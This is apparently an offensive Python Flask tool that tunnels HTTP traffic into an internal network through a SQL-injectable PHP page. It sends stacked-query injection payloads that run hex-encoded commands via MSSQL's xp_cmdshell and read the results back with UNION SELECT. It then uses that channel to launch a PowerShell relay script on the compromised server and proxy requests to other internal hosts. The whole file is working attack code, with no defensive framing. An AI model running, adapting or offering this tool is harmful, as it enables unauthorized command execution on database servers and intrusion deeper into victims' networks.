import base64
import binascii
import requests
from flask import Flask, request, make_response
import re

regex = 'MSSQL Proxy(.+?)MSSQL Proxy'
script_path = "C:/Users/MSSQLSERVER/AppData/Local/Temp/mssql_proxy.ps1"
app = Flask(__name__)


def exec_xp_cmdshell(cmd):
    url = 'http://10.37.129.4/sql.php'
    payload = "1';DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x%s;INSERT INTO sqlmapoutput(data) EXEC master..xp_cmdshell @bjxl-- ZKN" % binascii.hexlify(
        cmd.encode()).decode()

    requests.post(url, data={'id': "1'; DELETE FROM sqlmapoutput-- ZKN"})
    requests.post(url, data={"id": payload})

    res = requests.post(url, data={
        "id": "1' UNION ALL SELECT NULL, 'MSSQL Proxy' + ISNULL(CAST(data AS NVARCHAR(4000)),CHAR(32)) + 'MSSQL Proxy',NULL FROM sqlmapoutput ORDER BY id-- ZKN"
    })
    return ''.join(re.findall(regex, res.text))


def send_package(ip, port, data):
    cmd = "powershell {script_path} -remoteHost {ip} -port {port} -sendData {data}".format(
        script_path=script_path, ip=ip, port=port, data=data
    )
    print(cmd)
    return exec_xp_cmdshell(cmd)


def clean_up_response(response):
    response = binascii.unhexlify(response.strip().encode()).decode()
    headers = response.split('\r\n\r\n')[0]
    body = '\r\n\r\n'.join(response.split('\r\n\r\n')[1:]).strip()
    res = make_response(body)
    res.status = ' '.join(headers.split('\r\n')[0].split(' ')[1:])
    for header in headers.split('\r\n')[1:]:
        res.headers[header.split(':')[0]] = ':'.join(header.split(':')[1:])
    return res


@app.before_request
def before_request():
    if request.method == 'CONNECT':
        return
    package = '{method} {path} {version}\r\n'.format(
        method=request.method,
        path=request.full_path,
        version=request.environ['SERVER_PROTOCOL']
    ).encode()
    host = ''
    for k, v in dict(request.headers).items():
        if k.upper() == 'Connection'.upper():
            package += b'Connection: close\r\n'
            continue
        if k.upper() == 'HOST':
            host = v
        package += '{k}: {v}\r\n'.format(k=k, v=v).encode()
    package += b'\r\n'
    package += request.stream.read()
    # print(package)
    if not host:
        return "HostNotFound\r--MSSQL Proxy"
    if len(host.split(':')) > 1:
        ip, port = host.split(':')
    else:
        ip, port = host, 80
    response = send_package(ip, port, base64.b64encode(package).decode())
    if response.strip() == 'FAILED':
        return "Failed\r--MSSQL Proxy", 902
    return clean_up_response(response)


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=4000)
